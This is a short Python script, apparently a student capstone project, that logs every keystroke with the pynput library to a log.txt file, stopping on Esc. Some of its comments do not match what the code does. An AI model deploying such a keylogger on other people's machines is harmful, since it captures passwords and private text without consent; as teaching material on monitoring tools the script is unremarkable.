# Catherine Balaban - Capstone Project
# This keylogger is pretty basic it tracks every keystroke.  It can create a log.txt file but must be
# changed manually on the second run.  This could only be for personal use.  This keylogger also formats
# the output to that a press of a space bar is recorded as an actual space and backspaces do reduce from
# the text file


import pynput

from pynput.keyboard import Key, Listener  # this will listen for out key events

count = 0  # every so many key presses the file will be updated
keys = []


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0  # resets the count amount
        write_file(keys)
        keys = []


def write_file(keys):  # will write to a file
    with open("log.txt", "a")as f:
        # using the 'w' will create a new file ('a' must be used every other run
        for key in keys:
            k = str(key).replace("'", "")  # removes the quotation marks in txt file
            if k.find("space") > 0:  # looks for Key.space
                # f.write(str(key))   this will write all the key presses into the file
                f.write('\n')  # replaces the Key.spce with a new line
            elif k.find("Key") == -1:  # these two lines will remove the 'backspace'
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False
    # loop will break if esc key is pressed


with Listener(on_press=on_press, on_release=on_release) as listener:
    # understand when a key is pressed and when a key is released
    listener.join()  # this will keep running as a loop until it is broken out of

